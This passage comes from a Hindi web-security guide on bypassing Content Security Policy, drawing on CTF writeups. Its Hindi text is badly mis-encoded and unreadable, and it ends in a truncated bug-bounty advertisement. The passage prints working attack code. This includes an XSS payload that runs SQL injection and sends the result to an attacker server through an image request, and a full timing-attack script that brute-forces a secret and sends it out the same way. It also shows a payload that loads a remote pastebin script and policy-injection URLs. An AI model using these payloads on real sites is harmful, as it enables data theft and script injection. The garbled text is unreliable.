рдЖрдк рдЗрд╕ CSP рдХреЛ рдЫрд╡рд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓рдХрд░ рдЗрд╕реЗ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЗрд╕ рдЕрд╡рд╕рд░ рдореЗрдВ XSS рдПрдХ CSRF рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдмреЙрдЯ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рдкреГрд╖реНрда рдореЗрдВ рдПрдХ SQLi рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЫрд╡рд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдзреНрд╡рдЬ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ):
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

рдЖрдк рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЫрд╡рд┐ рдореЗрдВ рд╕рдореНрдорд┐рд▓рд┐рдд рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрдЧрд░ рдкреЗрдЬ рдЯреНрд╡рд┐рдЯрд░ рд╕реЗ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рддреЛ рдЖрдк рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЫрд╡рд┐ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдЯреНрд╡рд┐рдЯрд░ рдкрд░ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ "**unsafe-inline**" рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ JS рдХреЛрдб (рдПрдХ рдирд┐рдпрдорд┐рдд XSS рдХреЗ рд░реВрдк рдореЗрдВ) рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЫрд╡рд┐ рдХреЛ рд▓реЛрдб рдХрд░реЗрдЧрд╛, рдЙрд╕рд╕реЗ JS рдХреЛ рдирд┐рдХрд╛рд▓реЗрдЧрд╛ рдФрд░ рдЙрд╕реЗ рдЪрд▓рд╛рдПрдЧрд╛: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде

рд╕реЗрд╡рд╛ рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдХреА **`importScripts`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ CSP рд╕реЗ рд╕реАрдорд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### рдиреАрддрд┐ рдЗрдВрдЬреЗрдХреНрд╢рди

**рд╢реЛрдз:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

рдпрджрд┐ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП **рдкреИрд░рд╛рдореАрдЯрд░** рдХреЛ **рдиреАрддрд┐** рдХреЗ **рдШреЛрд╖рдгрд╛** рдореЗрдВ **рдкреЗрд╕реНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдиреАрддрд┐ рдХреЛ рдРрд╕реЗ рдХрд┐рд╕реА рддрд░реАрдХреЗ рд╕реЗ **рдмрджрд▓ рд╕рдХрддреЗ** рд╣реИрдВ рдЬреЛ рдЗрд╕реЗ **рдЕрдиреБрдкрдпреЛрдЧреА** рдмрдирд╛ рджреЗрддрд╛ рд╣реИред рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдмрд╛рдЗрдкрд╛рд╕ рдХреЗ рд╕рд╛рде рд╕реНрдХреНрд░рд┐рдкреНрдЯ 'unsafe-inline' рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ **рдореМрдЬреВрджрд╛ script-src рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рджреЗрдЧрд╛**ред
рдЖрдк рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edge рдореЗрдВ рдпрд╣ рдХрд╛рдлреА рд╕рд░рд▓ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрд╕рдореЗрдВ CSP рдореЗрдВ рдмрд╕ рдпрд╣ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ: **`;_`** рддреЛ **Edge** рдкреВрд░реА **рдиреАрддрд┐** рдХреЛ **рдЫреЛрдбрд╝ рджреЗрдЧрд╛**ред
рдЙрджрд╛рд╣рд░рдг: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XSS (iframe) - рд╕рдордп рд╣рдорд▓рд╛

рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ `'unsafe-inline'` рдХреА рдХрдореА рдХрд╛ рдзреНрдпрд╛рди рджреЗрдВред
рдЗрд╕ рдмрд╛рд░ рдЖрдк XSS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ `<iframe>` рдХреЗ рд╕рд╛рде рдкреАрдбрд╝рд┐рдд рдХреЛ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ рдкреГрд╖реНрда **рд▓реЛрдб** рдХрд░рд╡рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдмрд╛рд░ рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рдкреГрд╖реНрда рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдВрдЧреЗ рдЬрд╣рд╛рдВ рд╕реЗ рдЖрдк рд╕реВрдЪрдирд╛ (**CSRF**) рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред рдЖрдк рдкреГрд╖реНрда рдХреА рд╕рд╛рдордЧреНрд░реА рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЖрдк рдкреГрд╖реНрда рдХреЛ рд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдордп рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЖрд╡рд╢реНрдпрдХ рд╕реВрдЪрдирд╛ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдмрд╛рд░ рдПрдХ **рдзреНрд╡рдЬ** рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛, рдЬрдм рдПрдХ **рд╡рд░реНрдг рд╕рд╣реА рд░реВрдк рд╕реЗ рдЕрдиреБрдорд╛рдирд┐рдд** рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдореЗрдВ **рдЕрдзрд┐рдХ рд╕рдордп** рд▓рдЧрддрд╛ рд╣реИ рдиреАрдВрдж рдХреА рд╡рдЬрд╣ рд╕реЗред рдлрд┐рд░, рдЖрдк рдзреНрд╡рдЬ рдирд┐рдХрд╛рд▓ рд╕рдХреЗрдВрдЧреЗ:
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### рдмреБрдХрдорд╛рд░реНрдХрд▓реЗрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░реНрддреА **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдпрд╣ рдзреЛрдЦрд╛ рджреЗрдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рд╡рд╣ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдмреБрдХрдорд╛рд░реНрдХрд▓реЗрдЯ рдкрд░ рдПрдХ рд▓рд┐рдВрдХ рдХреЛ рдЦреАрдВрдЪрдХрд░ рдЫреЛрдбрд╝ рджреЗрдВ**ред рдпрд╣ рдмреБрдХрдорд╛рд░реНрдХрд▓реЗрдЯ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЛрдб рдХреЛ рд╕рдореЗрдд рдХрд░реЗрдЧрд╛ рдЬреЛ рдЬрдм рдЦреАрдВрдЪрдХрд░ рдЫреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рдпрд╛ рдХреНрд▓рд┐рдХ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рддреЛ рд╡рд╣ рдореМрдЬреВрджрд╛ рд╡реЗрдм рд╡рд┐рдВрдбреЛ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛, **рд╕реАрдПрд╕рдкреА рдХреЛ рдЫрд▓рдХрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЪреЛрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЬреИрд╕реЗ рдХрд┐ рдХреБрдХреАрдЬрд╝ рдпрд╛ рдЯреЛрдХрдиред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдпрд╣рд╛рдВ рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рджреЗрдЦреЗрдВ**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### рд╕реАрдПрд╕рдкреА рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдХреЗ рд╕реАрдПрд╕рдкреА рдХреЛ рдЫрд▓рдХрд╛рдирд╛

[**рдЗрд╕ CTF рд╡реНрд░рд┐рдЯрдЕрдк рдореЗрдВ**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), рд╕реАрдПрд╕рдкреА рдХреЛ рдЫрд▓рдХрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рдЖрдЗрдлреНрд░реЗрдо рдореЗрдВ рдПрдХ рдФрд░ рд╕реАрдПрд╕рдкреА рдбрд╛рд▓рдХрд░ рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рд╣реИ рдЬреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖ JS рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддреА рд╣реИ, рдлрд┐рд░ рдЙрд╕реЗ **рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг** рдпрд╛ **рдбреЙрдо рдХреНрд▓реЙрдмрд░рд┐рдВрдЧ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдЕрд▓рдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдЬреЛ **рдПрдХ рдЕрдирд┐рдпрдорд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред

рдЖрдк рдПрдХ рдЖрдЗрдлреНрд░реЗрдо рдХреА рд╕реАрдПрд╕рдкреА рдХреЛ **`csp`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

[**рдЗрд╕ CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48) рдореЗрдВ, **HTML injection** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **CSP** рдХреЛ рдФрд░ рдЕрдзрд┐рдХ **рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рдерд╛, рдЗрд╕рд╕реЗ CSTI рдХреЛ рд░реЛрдХрдиреЗ рд╡рд╛рд▓рд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдХреНрд╖рдо рд╣реЛ рдЧрдпрд╛ рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ **рджреБрд░реНрдмрд▓рддрд╛ рдЙрдкрдпреЛрдЧреА рдмрди рдЧрдИред**\
CSP рдХреЛ **HTML рдореЗрдЯрд╛ рдЯреИрдЧ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ рдЗрдирд▓рд╛рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ **рд╣рдЯрд╛рдХрд░** рдФрд░ рдЙрдирдХреА **рдиреЙрдиреНрд╕** рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ **рдПрдВрдЯреНрд░реА** рдХреЛ **рд╢рд╛рдиреБрд╕рд╛рд░ рдЗрдирд▓рд╛рдЗрди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ**:
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Content-Security-Policy-Report-Only рдХреЗ рд╕рд╛рде JS рдирд┐рд░реНрдпрд╛рдд

рдпрджрд┐ рдЖрдк рд╕рд░реНрд╡рд░ рдХреЛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП **`Content-Security-Policy-Report-Only`** рд╣реИрдбрд░ рдХреЗ рд╕рд╛рде рдПрдХ **рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдорд╛рди** рдХреЗ рд╕рд╛рде рд╕рдВрдкрд░реНрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╢рд╛рдпрдж CRLF рдХреЗ рдХрд╛рд░рдг), рддреЛ рдЖрдк рдЗрд╕реЗ рдЕрдкрдиреЗ рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдпрджрд┐ рдЖрдк рдЬрд┐рд╕ JS рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕реЗ **`<script>`** рдХреЗ рд╕рд╛рде **рдврдХ рджреЗрддреЗ рд╣реИрдВ** рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрднрд╛рд╡рддрдГ `unsafe-inline` рдХреЛ CSP рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реЛрдЧреА, рдЗрд╕рд╕реЗ рдПрдХ CSP рддреНрд░реБрдЯрд┐ рдЙрддреНрдкрдиреНрди рд╣реЛрдЧреА рдФрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ (рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕рдореЗрдд) `Content-Security-Policy-Report-Only` рд╕реЗ рд╕рд░реНрд╡рд░ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛ред

рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**рдЗрд╕ CTF рд╡реНрд░рд┐рдЯрдЕрдк рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)ред

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░рдирд╛ CSP + рдЖрдЗрдлреНрд░реЗрдо

рд╕реЛрдЪрд┐рдП рдПрдХ рд╕реНрдерд┐рддрд┐ рдЬрд╣рд╛рдВ рдПрдХ **рдкреЗрдЬ рдПрдХ рдЧреБрдкреНрдд рд╡рд┐рд╡рд░рдг рдХреЗ рд╕рд╛рде рдПрдХ рдЕрд▓рдЧ рдкреЗрдЬ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛ рд░рд╣рд╛ рд╣реИ** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдбрдорд┐рди** рдЬреЛ **redirectme.domain1.com** рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ, рд╡рд╣ **adminsecret321.domain2.com** рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЖрдк рдПрдбрдорд┐рди рдХреЗ рдкрд╛рд╕ XSS рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
**рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдкреЗрдЬреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкреЗрдЬ рдХреЛ рд╣реИред**

рдЖрдк рдПрдбрдорд┐рди рдХреЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдбреЛрдореЗрди рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* **CSP рдЙрд▓реНрд▓рдВрдШрди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ**
* **CSP рдирд┐рдпрдореЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред**

CSP рдЙрд▓реНрд▓рдВрдШрди рддрддреНрдХрд╛рд▓ рд▓реАрдХ рд╣реЛрддрд╛ рд╣реИред рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `https://redirectme.domain1.com` рдкрд░ рдкреЛрдЗрдВрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдЖрдЗрдлреНрд░реЗрдо рд▓реЛрдб рдХрд░реЗрдВ рдФрд░ `securitypolicyviolation` рдШрдЯрдирд╛ рдХреЛ рд╕реБрдиреЗрдВ рдЬрд┐рд╕рдореЗрдВ `blockedURI` рд╕рдВрдкрддреНрддрд┐ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдмреНрд▓реЙрдХ рд╣реБрдП URI рдХрд╛ рдбреЛрдореЗрди рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `https://redirectme.domain1.com` (CSP рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ) `https://adminsecret321.domain2.com` рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ (**CSP рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реБрджреНрдз** рдХрд┐рдпрд╛ рдЧрдпрд╛)ред рдпрд╣ CSP рдХреЗ рд╕рд╛рде рдЖрдЗрдлреНрд░реЗрдо рдХреЛ рдХреИрд╕реЗ рд╣реИрдВрдбрд▓ рдХрд░рдирд╛ рд╣реИ рдХреЗ рдЕрдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред Chrome рдФрд░ Firefox рдЗрд╕рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддреЗ рд╣реИрдВред

рдЬрдм рдЖрдк рдЧреБрдкреНрдд рдЙрдкрдбреЛрдореЗрди рдХреЛ рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЕрдХреНрд╖рд░реЛрдВ рдХреЛ рдЬрд╛рдирддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдПрдХ рдмрд╛рдЗрдирд░реА рд╕рд░реНрдЪ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХрдм CSP рдиреЗ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд┐рдпрд╛ рдФрд░ рдХрдм рдирд╣реАрдВ, рдФрд░ рдЗрд╕рдХреЗ рд▓рд┐рдП CSP рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдирд┐рд╖рд┐рджреНрдз рдбреЛрдореЗрди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЧреБрдкреНрдд рдбреЛрдореЗрди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝-X-XXXX.secdrivencontent.dev рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ)ред
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
рдпрд╣рд╛рдВ рд╕реЗ рдЯреНрд░рд┐рдХ [**рдпрд╣рд╛рдВ**](https://ctftime.org/writeup/29310) рд╕реЗ рд╣реИред

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдкреБрд░рд╕реНрдХрд╛рд░ рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдмрдЧ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдкреБрд░рд╕реНрдХрд╛рд░ рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
